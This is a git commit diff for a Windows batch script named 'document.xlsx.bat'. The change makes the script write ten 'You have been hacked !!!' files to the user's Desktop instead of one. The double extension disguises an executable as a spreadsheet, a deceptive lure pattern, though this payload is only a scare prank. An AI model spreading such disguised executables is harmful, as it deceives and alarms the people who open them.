5e0babd7a21be3f5aad247da2c765a5ab10bfe8d
Hauser77 <erisbet.pro@gmail.com>
2025-06-02 14:25:59 +0200

    Update document.xlsx.bat

--- document.xlsx.bat
+++ document.xlsx.bat
@@ -1,2 +1,8 @@
 @echo off
-echo You have been hacked !!! > %USERPROFILE%\Desktop\baka.txt
+setlocal
+
+for /L %%i in (1,1,10) do (
+    echo You have been hacked !!! > "%USERPROFILE%\Desktop\baka%%i.txt"
+)
+
+endlocal
